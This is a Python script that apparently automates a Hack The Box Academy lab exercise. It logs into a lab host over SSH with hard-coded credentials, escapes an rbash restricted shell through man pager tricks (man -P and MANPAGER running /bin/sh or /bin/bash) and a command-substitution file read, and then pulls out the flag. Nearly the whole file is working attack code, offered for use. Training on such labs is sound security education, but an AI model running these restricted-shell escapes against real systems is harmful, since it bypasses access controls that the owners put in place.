#!/usr/bin/env python3
"""
Restricted Shell Escape Solver

Automates multiple approaches for escaping/bypassing an rbash-style restricted
shell, then reads flag.txt and prints the discovered flag.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass
from typing import List, Optional

import paramiko


HOST = "10.129.205.109"
USERNAME = "htb-user"
PASSWORD = "HTB_@cademy_us3r!"
PORT = 22

FLAG_PATTERN = re.compile(r"HTB\{[^\r\n}]+\}")


@dataclass
class EscapeMethod:
    name: str
    command: str
    wait_seconds: float = 1.5


class RestrictedShellEscapeSolver:
    def __init__(self, host: str, username: str, password: str, port: int = 22) -> None:
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        self.client: Optional[paramiko.SSHClient] = None
        self.channel: Optional[paramiko.Channel] = None

    def connect(self) -> None:
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(
            self.host,
            port=self.port,
            username=self.username,
            password=self.password,
            timeout=15,
            banner_timeout=15,
            auth_timeout=15,
        )

        self.channel = self.client.invoke_shell(term="vt100", width=200, height=50)
        time.sleep(1.0)
        self._drain_channel()

    def close(self) -> None:
        try:
            if self.channel:
                self.channel.send("exit\n")
                time.sleep(0.2)
                self.channel.close()
        finally:
            if self.client:
                self.client.close()

    def _drain_channel(self) -> str:
        if not self.channel:
            return ""

        output = []
        while self.channel.recv_ready():
            output.append(self.channel.recv(65535).decode(errors="replace"))
            time.sleep(0.05)
        return "".join(output)

    def run_interactive(self, command: str, wait_seconds: float = 1.5) -> str:
        if not self.channel:
            raise RuntimeError("Interactive channel is not available")

        self.channel.send(command + "\n")
        time.sleep(wait_seconds)
        return self._drain_channel()

    @staticmethod
    def extract_flag(text: str) -> Optional[str]:
        match = FLAG_PATTERN.search(text)
        return match.group(0) if match else None

    def validate_restricted_context(self) -> None:
        shell_output = self.run_interactive("echo $0")
        path_output = self.run_interactive("echo $PATH")
        print("[+] Shell check output:")
        print(shell_output.strip())
        print("[+] PATH check output:")
        print(path_output.strip())

    def solve(self) -> Optional[str]:
        methods: List[EscapeMethod] = [
            EscapeMethod(
                name="Command substitution file read",
                command="echo $(<flag.txt)",
                wait_seconds=1.0,
            ),
            EscapeMethod(
                name="man pager escape via -P with /bin/sh",
                command="man -P '/bin/sh -c \"/bin/cat flag.txt\"' man",
                wait_seconds=2.0,
            ),
            EscapeMethod(
                name="MANPAGER environment escape",
                command="MANPAGER='/bin/sh -c \"/bin/cat flag.txt\"' man man",
                wait_seconds=2.0,
            ),
            EscapeMethod(
                name="man pager escape via -P with /bin/bash",
                command="man -P '/bin/bash -c \"/bin/cat flag.txt\"' man",
                wait_seconds=2.0,
            ),
        ]

        discovered_flags: List[str] = []

        for method in methods:
            print(f"\n[*] Trying method: {method.name}")
            output = self.run_interactive(method.command, wait_seconds=method.wait_seconds)
            print(output.strip())
            flag = self.extract_flag(output)
            if flag:
                print(f"[+] Success with: {method.name}")
                discovered_flags.append(flag)

        if discovered_flags:
            unique = []
            for item in discovered_flags:
                if item not in unique:
                    unique.append(item)
            return unique[0]

        return None


def main() -> None:
    solver = RestrictedShellEscapeSolver(HOST, USERNAME, PASSWORD, PORT)

    try:
        print(f"[+] Connecting to {HOST} as {USERNAME}")
        solver.connect()
        solver.validate_restricted_context()

        flag = solver.solve()
        if flag:
            print(f"\n[ANSWER] {flag}")
        else:
            print("\n[-] Failed to extract flag with the implemented methods.")
    except Exception as exc:
        print(f"[-] Error: {exc}")
    finally:
        solver.close()


if __name__ == "__main__":
    main()
